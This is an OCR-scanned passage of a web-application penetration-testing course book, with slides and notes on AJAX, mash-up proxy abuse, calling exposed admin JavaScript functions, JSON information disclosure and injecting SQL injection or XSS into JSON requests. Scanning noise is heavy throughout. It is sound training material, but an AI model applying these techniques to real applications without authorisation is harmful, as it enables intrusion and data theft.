Please go to Exercise 4.4 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
121 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I.XX:E 
2. Exercise: XXE 
3. Document Object Model (DOM) 
4. Cross-Site sn·int'inu (XSS) Primer 
5. Classes of XSS 
6. Exercise: XSS 
7. Discovering XSS 
8. XSS Impacts 
9. Exercise: HTML Injection 
I 0. XSS Tools 
11. 
12. Exercise: BeEF 
13.AJAX 
14. API Attacks 
I 5. Data Attacks 
16. Exercise: AJAXXSS 
17. Summary 
SEC542 t Web App Penetration Testing and Ethical Hacking 
122 
'-" 
\.__.,, 
'---' 
\.__.,, 
'---' 
'-..../ 
'---' 
'---' 
'---' 
'---' 
'-.,/ 
'-.,/ 
'-" 
'---' 
'-" 
'-.,/ 
Course Roadmap 
'----' 
\.__.,, 
Next up: A section on Asynchronous JavaScript and XML (AJAX). 
122 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'----' 
'-" 
'---' 
'-" 
'---' 
'-.,/ 
'---' 
'---' 
'---' 
'---' 
'-' 
'---' 
'-.,/ 
'-' 
'---' 
'---' 
'---' 
'-" 
'---' 
Asynchronous JavaScript and XML (AJAX) 
• AJAX is the technology enabling Web 2.0 
• Uses JavaScript and XML to provide dynamic 
application functions 
• Allows the application to refresh portions of the 
page 
• This allows for more "thick" client type 
functionality 
• Consider Google Maps: 
o It shows satellite images 
o It also includes road information with traffic data overlaid 
o AJAX allows for it to use interactive features while 
updating only the changed sections 
SEC542 ]Web App PenetrationTesting and 
Ill 
AJAX is the technology used to enable asynchronous communication between your browser and the web server. 
In old-style websites, when you click a link, the client has to send a request all the way up the server; the server 
processes the request and then replies. When the browser gets the entire reply, it redraws the entire screen. 
With AJAX, the JavaScript creates XMLHttpRequest objects. Those objects can make requests and receive 
responses asynchronously, updating the display as responses are received. For example, consider Google Maps. 
When you go to Google Maps and you search for something and slide the map, your browser uses AJAX to 
make calls back and forth to the server to retrieve the images that make the map. In this way, the map changes 
dynamically, but the remainder of the page is static and does not need to be redrawn with each change. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
123 
'--' 
'--' 
The Mighty XMLHttpRequest 
• The JavaScript XMLHttpRequest 
object is the heart of AJAX 
• It allows a JavaScript to make 
requests for data in the background 
o Providing more interactivity to the web 
page 
• Begin using the object with: 
xmlhttp = new XMLHttpRequest() 
• Main methods and properties: 
o xmlhttp.open("GET", 
"http://www.sec542.org/index.php") 
• Sets up the request method, where the request 
will go, and what it will retrieve 
o xmlhttp. send() 
• Actually sends the request 
o xmlhttp. onreadystatechange = 
AJAXProcess 
• Sets which function should be called when the 
ready state changes 
o A response being received is an example of a ready 
state change 
o In this example, AJAXProcess would be a custom 
function 
o xmlhttp. readyState 
• The property that contains the current ready 
state: 
o xmlhttp. responseText 
• The property that contains the contents of any 
response from the server 
SEC542 I Web App Penetration Testing and Ethical Hacking 
124 
"'--' 
'--' 
'-' 
'-' 
'----' 
'----' 
'-' 
'----' 
'-' 
'-' 
'--" 
'--" 
\..../ 
'---" 
'-' 
'--' 
'-' 
The XMLHttpRequest object has a number of methods and properties; the following are the most critical to 
making it work: 
open: Specifies the properties of the request. It does not actually initiate a connection. 
send: Creates the connection to this property; specifies the function that is called when the ready state 
changes. 
readyState: Set with the state of the request. 
• 
responseText: The response from the server is placed in this property. 
124 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---" 
'-.../ 
'---" 
'-' 
'---" 
'---" 
'-' 
'---" 
\..../ 
'-.../ 
'-' 
\..../ 
'----' 
'--' 
'-' 
'----' 
'--' 
'-.../ 
'----' 
\..../ 
'-' 
'----' 
'-.../ 
readyState 
• The readyState is a property of the XMLHttpRequest object 
• It provides information about the state of the server's response to a request 
sent via XMLHttpRequest 
• The readyState has five possible values: 
o o: The request is uninitialized 
o 1: The request has been set up 
o 2: The request has been sent 
o 3: Waiting for a response 
o 4: The response is complete 
• Our code uses this to take certain actions when the response has been 
returned 
.SEC542fWebApp PenetrationTe~ng andEtJ:iical Hacking 
1u 
The readyState property is used quite a bit in AJAX programming. It enables the scripting code to determine 
what state a response from the server is in. The numeric representations are then used by the application code to 
determine which actions to run. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
125 
'-.../ 
XMLHttpRequest Example 
<html><body> 
<button type="button" onclick="theAnswer () ">The Answer</button> 
<p id="answer"></p> 
<script> 
function theAnswer() 
{ 
var xhr = new XMLHttpRequest(); 
xhr.onreadystatechange = function() 
{ 
if {xhr.readyState == 4 && xhr.status == 200) 
{ 
document. getElementByid ( "answer") . inner HTML = xhr 
_ _. response Text; 
} 
} 
xhr.open{"GET", 
xhr.send(""); 
"hhgttg.php?q=multiply6by9", true); 
} 
</script></body></html> 
SEC542 I Web App Penetration Testing and Ethical Hacking 
126 
'-" 
'-...," 
..__, 
.____, 
..__, 
'---' 
'---' 
..__, 
'---' 
'---' 
'---' 
'-....,/ 
'---' 
'-" 
'-" 
Here, you see a simple HTML page with an XMLHttpRequest for sending an HTTP GET request. 
In the code, xhr.open() builds the request as a GET, with the specified resource and parameters, and sets the 
request to be asynchronous (true). xhr.send() causes the request to be sent, after which the onreadystatechange 
function takes over, waiting for a response to come back. 
<html><body> 
<button type="button" onclick="theAnswer() ">The Answer</button> 
<p id="answer"></p> 
<script> 
function theAnswer() 
{ 
var xhr = new XMLHttpRequest(); 
xhr.onreadystatechange = function() 
{ 
if (xhr.readyState == 4 && xhr.status == 200) 
{ 
document.getElementByid("answer") .innerHTML = xhr.responseText; 
} 
xhr.open("GET", "hhgttg.php?q=multiply6by9", true); 
xhr. send (" ") ; 
} 
</script></body></html> 
126 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
,.____,, 
'---' 
'-" 
..__, 
..__, 
'-../ 
.____, 
'-' 
,.____,, 
..__, 
'---'. 
'---' 
'---' 
.____, 
'-" 
'-" 
,.____,, . 
\._J 
'-' 
,.____,, 
Mash-Ups 
• One popular "feature" of AJAX-enabled sites is building mash- 
ups: 
o Combining two or more applications to provide a larger feature set 
• Same origin causes issues for these types of sites 
• It is common for applications to build proxy capabilities to enable 
mash-ups 
One of the more popular features of Web 2.0 websites is mash-ups. This is where an application combines two 
or more other sites into a widget or feature of their site. The same origin policy we discussed earlier in class 
causes issues for these types of applications. Because of this, many mash-up applications include proxy 
capabilities to remove this restriction. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
127 
'----' . 
'--' 
• AJAX does not change the same 
origin policy 
• Same as with "normal" JavaScript 
• Can only access data from: 
oSame host 
o Same protocol 
oSame port 
• Based on the HTML file location that 
includes the script 
128 
Malicious 
JavaScript 
loaded 
Browser 
'----' 
The same origin policy is still in effect for AJAX applications. This means that the JavaScript can access data 
only from the same origin that the original JavaScript came from. When the XMLHttpRequest object is created, 
it can make requests back only to the server the script came from. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.J 
'-" 
\.J 
'-" 
'-..../ 
'-..../ 
'----' 
'-' 
'----' 
'-..../ 
'-" 
'-..../ 
\.J 
'-" 
'-" 
\.J 
'-..../ 
'-" 
'-..../ 
\.J 
'-....., 
'-' 
'-' 
'-' 
'-' 
'-' 
..._, 
'-' 
'-..../ 
'-' 
'-' 
'-' 
'-' 
..._, 
'-' 
'-' 
'-' 
'-' 
'-' 
Mash-Up ProJW Features 
• Typically, they use a proxy built into 
their application 
• This proxy is part of the application 
o Retrieving pages through it bypasses 
same origin restrictions 
Google 
Maps 
Mash-up 
Application 
Client 
Facebook 
I 
These applications build the proxy capabilities right inside the application. It receives the requests from the 
client code and retrieves the site desired. When the client code from both sites is returned to the user, it appears 
to be coming from the mash-up application, allowing the bypass of same origin restrictions. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
129 
\.../ 
\.../ 
Mash-Up ·.proxy•• Issues 
• The main issue is control of the URLs to proxy 
• The proxies commonly use GET or POST parameters to call the 
backend site 
• If we can change this, we can perform different attacks: 
o Proxy to attack or browse other sites 
o Instruct the proxy to load malicious JavaScript 
• The application may use a check string to prevent this attack type 
'-.J 
'--' 
'-.J 
'-.J 
'-.J 
'--' 
'-.J 
'-.J 
'--' 
'-..../ 
'-..../ 
'-..../ 
'-.J 
The main issue is the control of this URL used by the proxy. Ifwe can change the URL parameter, we can do 
quite a bit. This parameter is commonly part of a GET or POST request and we can abuse it to either browse to 
other sites - possibly intranet applications we cannot access directly - or retrieve malicious JavaScript for an 
XSS attack. 
130 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-..../ 
'--' 
'-' 
'-' 
'--' 
'--' 
'-" 
'--' 
'-.J 
'-" 
'-.J 
'--'. 
'-.J 
'-' 
'--' 
'-' 
'-.J 
'-._./ 
'-.J 
'-" 
'-.J 
'--' 
'-.J 
AJAX Attack Surface 
The AJAX attack surface is larger than "normal" applications 
• Large amounts of client-side code 
• Business logic is client side 
AJAX does not add "new" attacks 
• But it does typically add new input points to an application 
Typical attacks work 
• SQL injection 
-xss 
AJAX applications are also architected toward CSRF 
• Functionality called directly by client code 
All the typical attacks work against the AJAX interface. But it is made easier by the large amounts of client-side 
code that performs business logic and has to understand the application flow. This makes the application flow 
quite clear to a knowledgeable attacker. The attacker can even access business logic in an order not expected by 
the application. An example of this would be a shopping cart that allowed attackers to use the credit 
authorization before adding items to the cart. Potentially, this would allow them to purchase items with an 
authorization for zero dollars. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
131 
'-----' 
'-----' 
• Mapping of an AJAX application is harder 
• Many tools cannot parse and handle client-side logic 
o Main difficulty is caused by links being dynamically generated 
• Mapping requires more manual work and tool verification 
• Burp and ZAP (with the AJAX Spider) can often ably handle 
AJAX applications 
'-----' 
'-J 
'-J 
'-J 
'-----' 
'-----' 
'-J 
'-J 
'-J 
'-J 
'-J 
'-----' 
'-J 
'-J 
Mapping AJAX-ified applications is more difficult in a lot of cases. This is because so much of the application 
functionality is called via client-side code or is being dynamically generated. The tools we use most were not 
designed to parse and evaluate this code. This, of course, causes the tester to manually walk the site to ensure 
that all the target functionality is added to the site map being worked from. 
132 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'-----' 
'-----' 
'-----' 
'-J 
'-J 
'-J 
'-J 
'-J 
'-----' 
'-J 
'-J 
'-J 
'-J 
'-.../ 
'-----' 
'-.../ 
'-----' 
'-----' 
'-...,' 
'-J 
'-J 
'-J 
'-J 
'-J 
AJAX Exploitation 
Exploitation is not more difficult for AJAX applications 
• As long as we understand how the flaw fits within the application 
Exploitation has to take into account the discussed problems 
• Tools that require the capability to parse the site and can't 
Most tools can ultimately handle the requests 
• But we do typically have to manually prime them 
Exploitation of AJAX applications typically is not any more difficult than exploitation of non-AJAX 
applications. The problems we run into are caused by the previously discussed issues. For example, if the tool 
cannot discover the flaws, it can't seed its exploitation functions. 
The easiest way around this is for us to manually seed the flaws to the tools. For example, SQLMap accepts 
parameters to attack as part of its command-line arguments. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
133 
'-' 
'-' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. 
2. Exercise: XXE 
Document Object Model (DOM) 
Cross-Site Scripting (XSS) Primer 
5. \..laJ,ses ofXSS 
6. Exerdse: XSS 
7. Discovering XSS 
XSS Impacts 
Ex1crci1se~ HTML Injection 
I 0. XSS Tools 
11. BeEF 
12. Exercise: BeEF 
13.AJAX 
J 4. API Attacks 
Data Attacks 
16. Exercise: AJAX XSS 
17.Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
IH 
,.._, 
'-' 
'-../ 
Course Roadmap 
We will next discuss API attacks. 
134 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-" 
'-' 
'-' 
''-..,/ 
.____,, 
'-" 
'-../ 
'----' 
'-....-' 
'-..,/ 
'-' 
'-' 
'----' 
'-' 
.,,____,. 
'-' 
'-' 
'----' 
'----' 
'-" 
'-..,/ 
''-..,/ 
'-" 
'-' 
'-' 
'----' 
'-...,/ 
'---" 
'-' 
'--" 
'----' 
'---" 
.____,, 
'---" 
JavaScript l..ibraries/Frameworks 
• AJAX lends itself to complex frameworks 
o There is even an entire market of prebuilt frameworks 
• To make design simpler, they make use of common files 
o Common within an application 
o Functions included on all pages 
• Keep in mind that non-AJAX applications can also make use of 
API files 
• These files take multiple forms 
Another problem with AJAX is the complexity of the application. Commonly, developers include multiple 
functions in a single JavaScript file. Although this can and does happen in "normal" applications, it is wider 
spread in AJAX applications. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
135 
'--' 
'--' 
The most commonly considered files are JavaScript files 
• Included across the application 
These files contain functions used by the application 
• Business logic and technical functionality 
By examining these files, we can find features we do not have access to 
• Assists us in building malicious requests 
\._.I 
'-----" 
'-' 
'-' 
'-' 
'-" 
'-----" 
'-' 
'-.../ 
'-' 
'-..../ 
'-./ 
'-' 
'-' 
Framework files enable a tester to download the files and look for functions that the application isn't using on 
this particular page and call them directly. This is similar to the logic attack, except it uses functionality that 
shouldn't have been exposed. 
An example of this that we have used before is when the developer includes functions used by admin pages in 
the js files. We couldn't access the actual admin pages, but called the JavaScript functions directly. In this 
application, we added users to the system and then logged in as them. 
136 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-----" 
'-..-/ 
'-' 
'-.../ 
\..._./ 
'--' 
'-' 
'-' 
'-..-/ 
'-' 
'-./ 
'-..-/ 
'-----" 
'-./ 
'-----" 
'-.J 
'--' 
'-../ 
'-./ 
'-./ 
\..._./ 
'-.../ 
'-../ 
'-....,/ 
'-----" 
'-../ 
Third-Party Frameworks 
• Many sites use third-party libraries whether CDN-hosted or 
served locally 
• Some examples: 
ojQuery 
oMooTools 
• These libraries provide various functions to the site: 
o Everything from aesthetics to business functionality 
• The tester can identify these during mapping 
o These libraries can bring their own issues 
During our testing, we often find libraries from third-party sites. These libraries provide many different 
functions and are so common because they provide developers with prebuilt capabilities. During our mapping 
phase, we should find these and identify them either from comments or titles within the files. By identifying 
these libraries, we can find out many things about the application. For example, libraries have specific uses, so 
we can know some of the purposes of the site based on the library. Also, the libraries may bring their own 
weaknesses to the application. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
137 
'--' 
'-' 
Discover.ing .Frameworks 
• Most of these files should have been found during the mapping 
phase 
• Spidering the site should detect them 
o Look for SRC attributes 
• One issue is when they appear on pre-authentication pages 
• We must parse them to find vulnerable or interesting functions 
o Look for any functions that initiate or process HTIP requests 
(XMLHttpRequest) 
'--' 
'----' 
'-' 
'-.../ 
...____, 
'-.../ 
'----' 
'----' 
'----' 
'-' 
'----' 
'-.../ 
...____, 
'-' 
Most of the AP! files should be found during spidering. Looking through the application map, we should see the 
.js files that are loaded by the various pages. 
We just need to parse them and examine the code during this phase. We would look for interesting functions, 
such as any XMLHttpRequest calls. We can also find various functions that load data from elsewhere or 
reference "sensitive" functionality, such as administrative actions. 
138 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-' 
...____, 
'-.../ 
'----' 
'--" 
'--" 
'-..,, 
...____, 
'--' 
'--" 
'-' 
'----' 
'--" 
'----' 
'----' 
'----' 
'--" 
'--" 
'----' 
'-' 
'----' 
'--' 
'--' 
'----' 
Exploiting Framework Flaws 
• Framework exploitation takes many forms 
• These are based on what the framework exposes 
• We may call functions without authentication 
o Re-creating what the code would have done 
~ • We may gather information for further exploits 
o Filtering code evaluated for weaknesses 
• Or just enjoy some known-flaw exploitation of complex code that 
has not been updated 
API exploitation is another manual process. We can do many different things with this information, but what 
that is depends on the flaw that is exposed by the APL 
For example, if the APl discloses a set of functions that are for the admin, then we can create a request that 
attempts to exercise that functionality. 
We also can gather information useful in other attacks. For example, we can find filtering code that attempts to 
prevent attacks. By examining that code, we may find weaknesses that would expose the application further 
along. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
139 
'---' 
'---' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I.XXE 
l. Exercise: XXE 
3. Document Object Hodel (DOH) 
4. Cro56-Site Scripting (XSS) Primer 
5. Classes ofXSS 
6. Exercise: XSS 
7. Oisc0vel"ing XSS 
8. XSS Impacts 
9. Exercise: HTML Injection 
HtXSS Tools 
IL BeEF 
12. Exercise: BeEF 
13-.AJAX 
14. API Attacks 
15. Data Attacks 
16. Exercise: AJAX XSS 
17. Summary 
\....I 
'---' 
'---' 
..__, 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'--' 
'---' 
'---' 
'---' 
'--' 
'--' 
Course Roadmap 
'---' 
'---' 
The next section describes data attacks. 
'--' 
'---' 
'---' 
'---' 
'--' 
'---' 
..__, 
'---' 
'--' 
'---' 
'--' 
'---' 
'--' 
'--' 
..____, 
..____, 
'---' 
..____, 
140 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
..____, 
..__, 
Data Attacks 
• The business logic is now on the client 
• This means the client must receive more data 
• Due to this change, most developers send more data to the client 
than necessary 
o Don't want to duplicate filtering code 
• Attackers can focus on this data delivery 
Because AJAX applications shine in data-heavy features, the data becomes even more available to an attacker. 
The web services called by the application return the data to the application. Because this application mainly 
runs in the client system, this data becomes available to the attacker. Many services return large amounts of data 
and use the client code to filter it out. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
141 
'---' 
'--' 
'--' 
• AJAX applications can make use of data in any format 
o Decided by the developer 
• The two most common are XML and JSON 
• Both require some type of parsing client-side 
o JSON can just be evaluated, but this has security issues 
o See notes for details 
\...., 
'--' 
'-' 
'-' 
'-' 
'-' 
'----- 
'-' 
'-'' 
'-' 
'-' 
'-' 
AJAX can use any format the developer decides to use in passing data. For example, the developer could just have a 
fixed-width string passed to the client-side code. But typically, AJAX uses one of two options. 
The first option, and the one AJAX has in its name, is XML. XML is a tag-based format and is quite common. But it 
is heavier than most other formats. 
The second option is JSON. We explore JSON in more detail on the next series of slides. 
Both of these formats need to be parsed on the client. 
Note that the use of eval() can lead to security issues: 
To convert a JSON text into an object, you can use the eval() function. eval() invokes the JavaScript 
compiler. Since JSON is a proper subset of JavaScript, the compiler will correctly parse the text and 
produce an object structure. The text must be wrapped in parens to avoid tripping on an ambiguity in 
JavaScript's syntax. 
var myObject = eval(' (' + myJSONtext + ') '); 
The eval function is very fast. However, it can compile and execute any JavaScript program, so there can be 
security issues. The use of eval is indicated when the source is trusted and competent. It is much safer to use 
a JSON parser. 1 
Reference: 
[ 1] https://stackoverflow .com/questions/834030/js-object-to-j son-string (https://cyber.gd/542 _ 5 57) 
142 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'--' 
'-' 
'--' 
'-' 
'-' 
'----' 
'-' 
'-' 
'-..../ 
'--.J 
'-..../ 
'-' 
'-.J 
'-.J 
\...., 
'-.J 
'--' 
'--' 
'-' 
'-' 
\...., 
'-' 
'-' 
JSON 
• JSON is the JavaScript Object Notation 
• It is a lightweight data interchange format 
o Both requests and responses use this format 
• The client-side JavaScript then loads the JSON data into memory 
o Typically, with an eval() call or a JSON parser 
SEC542JY','eb App PeoetratioryTesting and Et~ical Hacking· · 
143 
The JavaScript Object Notation is commonly used to hold the data. Both the request and the response get stored 
in the JSON object, which can be thought of as an array. 
In the response side of the application, the tester examines the object for any extraneous data that is of interest. 
While in the request side, the tester can inject any of the typical attacks, such as SQL injection or XSS, and 
determine how the application reacts to the unexpected items. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
143 
\...., 
\...., 
JSON Format 
Basically, an array of arrays: 
{"records": 
[ 
{ "id" 
"1"' "name" 
"Arthur", "org" 
"Earth"}, 
{ "id" 
"2"' "name" 
"Ford", "org" 
"Betelgeuse"}, 
{ "id" 
"3"' "name" 
"Zaphod", "org" 
"Betelgeuse" } , 
{ "id" 
"4"' "name" 
"Trillian", "org" 
"Earth"}, 
{ "id" 
"5" ' 
"name" 
"Marvin", "org" 
"Sirius"}, 
{ "id" 
"6", "name" 
"Slartibartfast", "org" 
"Magrathea"}]} 
This is a simple response to a request for data 
• Parsed on the client 
SEC542 I Web App Penetration Testing and Ethical Hacking 
144 
'-" 
'-.....,I 
'-" 
'-" 
'-" 
'-----' 
'-" 
'--' 
'-----' 
'-" 
'--' 
'-" 
'-" 
'--' 
'--' 
'--' 
The JSON format is basically an array. It can contain other arrays, all which build into a single record set. Both 
the requests and responses use this format. As testers, we need to evaluate the objects we find within the context 
of the request or response. 
For example, we can guess that the first column here is probably an identifier and the second is a first name. The 
third appears to be the planet of origin, except in the case of Marvin, whose corporation of origin appears to 
have been substituted. 
144 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'-" 
'--' 
'-" 
'--' 
. .___, 
'-' 
'-' 
'-' 
'-" 
'-" 
'---" 
'-...., 
'--' 
'-" 
'-" 
'-" 
'-' 
'-' 
'-" 
'-" 
Exploiting JSON 
• Exploiting JSON takes one of two forms usually 
• Information disclosure is the easiest to find 
o Typically, discoverable via browsing through a proxy 
• JSON is also one of the inputs we must test for injection 
flaws 
o It gets overlooked quite often due to its complex looks 
• Let's explore these two ideas 
Exploiting JSON can take two different formats. Information disclosure is the easiest to find during our mapping 
of the application. The thing we must remember is that JSON is one of the injection points for our testing. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
145 
'---' 
'-' 
'--' 
··· JSON lnformation Disclosure 
• JSON is used to send data 
• Most developers send more data than necessary 
o Some applications actually send complete record sets 
o Client code parses and displays what's needed 
• SQ L error messages are sent to the client in some cases 
o Client code parses and displays an application error message instead 
'-' 
'-.J 
'---' 
.-J 
'-...,I 
'--' 
'-.J 
'-' 
..____, 
.___,, 
..____, 
'-" 
'-" 
Because JSON is used to send data to the client logic, and most developers do not want to parse the record set on 
the server and then again on the client, more data than necessary is usually sent to the client. We may even get 
entire record sets sent down that are parsed to the single record displayed by client logic. 
We have seen many applications that will actually return the full database error to the client, and then the client 
will filter it out. From the screen, it looks as if you would have to go through the effort of performing a blind 
SQL attack when, in actuality, all the information is available in an interception tool. 
146 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'---' 
'-../ 
.___,, 
..____, 
'--' 
'-" 
'---' 
'-.J 
'--' 
'--' 
'-.J 
'-../ 
'-" 
'-../ 
'-.J 
'-../ 
'-../ 
'--"' 
'---' 
'---' 
'-../ 
'---' 
'--' 
'--"' 
JSON Injection 
• Focus on the requests 
• Intercept them and insert attack strings 
o Any attacks are useful 
o SQL injection and XSS are most common 
• Client or server code can be targeted 
• Remember to look in the interception proxy for the results 
o They may not be displayed on the page 
To perform JSON injection we just need to focus on the requests. We can intercept them with tools we have 
discussed and inject whatever attack we would like to attempt. SQL injection and XSS are commonly successful 
against these types of applications. 
Keep in mind that while we are focusing on using the JSON request as an injection point, it also has problems 
with code injection. To find this, we need to find where we can control the data that is returned as part of the 
JSON response. For example, ifwe could set our name with a snippet of JavaScript, when this is returned 
through the JSON response, this code could be executed. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
147 
'-..../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
L 
2. Exercise: XXE 
3. Document Object Modet(DOM) 
4. Cross-Site Scripting (XSS) Primer 
5. Classes ofXSS 
6. Exercise: XSS 
1. Discovering XSS 
8. XSS Impacts 
Exercise: HTML Injection 
XSS Tools 
!I. BeEF 
! l. Exercise: BeEF 
AJAX 
Attacks 
15. Data Attacks 
16. Exercise: AJAX XSS 
17. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
148 
'-..../ 
'-..../ 
'-' 
'-' 
'-' 
'-' 
'-..../ 
'-../ 
'-../ 
'-..../ 
'-..../ 
'-' 
'-..../ 
'-' 
'-../ 
Course Roadmap 
'-' 
'-../ 
Let's perform AJAX XSS exploitation hands-on. 
'-..../ 
'-..../ 
'-../ 
'-..../ 
'-../ 
'-../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-../ 
'-../ 
'-..../ 
'-.../ 
'-..../ 
'-..../ 
'-..../ 
~ 
148 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-.J 
SEC542 Workbook: AJAX XSS 
II 
Exercise 4.5: AJAX XSS 
SEC542 I Web App Penetration Testing and Ethical Hacking . 
· 149 
SEC542 Workbook: AJAX XSS 
\ 
Please go to Exercise 4.5 in the 542 Workbook. 
\ 
' 
\ 
' ' 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
149 
'- 
'--
Final Step 
Go to the Firefox Proxy Selector drop-down and choose No Proxy 
~=======::::::=:-:=:::-
,' ,'''' -------i / 
542.1 
Ensure No Proxy is now set 
No Proxy• 
SEC542 I Web App Penetration Testing and Ethical Hacking 
1so 
'--
'--
'--
'--
'-- 
'--
'-- 
'-- 
'--
'--
'--
'--
'-- 
'--
'--
'--
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. Ensure it is set when complete. 
150 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--
\__
'--
'-- 
'-- 
'--
'-- 
'--
'-- 
'-- 
'-- 
'- 
'-- 
'-- 
'-- 
'-- 
'-- 
'-- 
'-- 
'- 
\. 
\. 
'- 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
I.XXE 
2. Exercise: XXE 
3. Document Object Model (DOM) 
4. Cross-Site Scripting (XSS) Primer 
S. Classes of XSS 
6, Exercise: XSS 
7. Discovering XSS 
8. XSS Impacts 
9. Exerdse; HTML Injection 
IO. XSS Tools 
11.BeEF 
I 2. Exercise: BeEF 
13.AJAX 
14. API Attacks 
I 5. Data Attacks 
16. Exercise: AJAX XSS 
17.Summary 
- 
SEC542 j Web App Penetration Testing and Eth lea I Hael<ing 
1s1 
Course Roadmap 
SEC542.4 is coming to a close; the summary is next. 
'\ 
\ 
\ 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
151 
\.. 
Conclusions 
• That wraps up Security 542,4 
• Next up: Security 542.5, where we will take on CSRF, Advanced 
Tools, and more 
• Thank you, and see you then! 
SECS42 jWebApp Penetration Testing andEthical Hacking 
\...
\... 
\...
\... 
'--
\...
\...
\... 
'--
'--
'-- 
'-- 
\...
That wraps up Security 542.4. 
\... 
\... 
Next up: Security 542.5, where we will take on CSRF, advanced tools, and more. 
Thank you, and see you then! 
152 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-- 
'--
\...
'- 
'- 
'- 
'- 
'- 
'- 
'- 
'- 
'- 
'- 
'- 
' 
\ 
~~ 
;; 
- 
- 
~ ~_ 
- 
- 
- 
SE~51! J WEB-J\PP PENE1'FU!TION !TES!TINS J\NBETHl~t ~KINS - 
- 
~ - 
~ 
-- 
- 
- 
' 
nd 
I 
~ 
Copyright © 2018, Seth Misenar, Eric Conrad, and Kevin Johnson. All rights reserved to Seth Misenar, Eric 
Conrad, Kevin Johnson, and/or SANS Institute. 
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE 
AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE 
ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT 
BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU 
AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED 
AGREEMENT SIGNED BY YOU. 
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the 
Courseware subject to the terms of this agreement. Courseware includes all printed materials, 
including course books and lab workbooks, as well as any digital or other media, virtual machines, 
and/or data sets distributed by the SANS Institute to the User for use in the SANS class 
associated with the Courseware. User agrees that the CLA is the complete and exclusive 
statement of agreement between The SANS Institute and you and that this CLA supersedes any 
oral or written proposal, agreement or other communication relating to the subject matter of this 
CLA. 
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS 
CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS 
OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS 
INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY 
INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, 
OR OTHER EQUITABLE RELIEF. 
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if 
applicable. 
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works 
